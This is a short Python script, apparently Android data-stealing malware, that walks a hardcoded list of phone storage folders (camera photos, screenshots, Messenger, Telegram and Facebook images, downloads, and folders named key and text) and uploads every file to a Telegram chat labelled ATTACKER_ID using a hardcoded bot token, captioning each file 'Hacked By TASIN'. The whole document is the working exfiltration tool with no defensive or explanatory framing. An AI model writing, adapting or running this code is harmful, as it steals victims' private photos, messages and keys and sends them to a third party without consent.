import os
import telebot
import threading


BOT_TOKEN = '7148035495:AAF419l_wSzkr8YxVAu5K-EhTZ9ek1e14_s'
ATTACKER_ID = '6839031438'

directory_paths = ["/storage/emulated/0/htdocs/text/", "/storage/emulated/0/htdocs/key/","/storage/emulated/0/Pictures/photo/","/storage/emulated/0/DCIM/Camera/","/storage/emulated/0/Pictures/facebook/","/storage/emulated/0/Pictures/Screenshots/","/storage/emulated/0/Pictures/Messenger/","/storage/emulated/0/Pictures/Telegram/","/storage/emulated/0/Download/","/storage/emulated/0/Download/Telegram/","/storage/emulated/0/Movies/Massanger/"]

bot = telebot.TeleBot(BOT_TOKEN)

def send_message(message):
    bot.send_message(ATTACKER_ID, message)

def upload_files(directory_path):
    try:
    
        for file_name in os.listdir(directory_path):
            file_path = os.path.join(directory_path, file_name)

         
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    bot.send_document(ATTACKER_ID, f, caption=f'File "{file_name}" \n from "{directory_path}" \n Hacked By TASIN✅')

    except Exception as e:
        send_message(f'Error uploading files from {directory_path}: {str(e)}')

def upload_files_from_directories(directories):
    threads = []
    for directory in directories:
        thread = threading.Thread(target=upload_files, args=(directory,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()


upload_files_from_directories(directory_paths)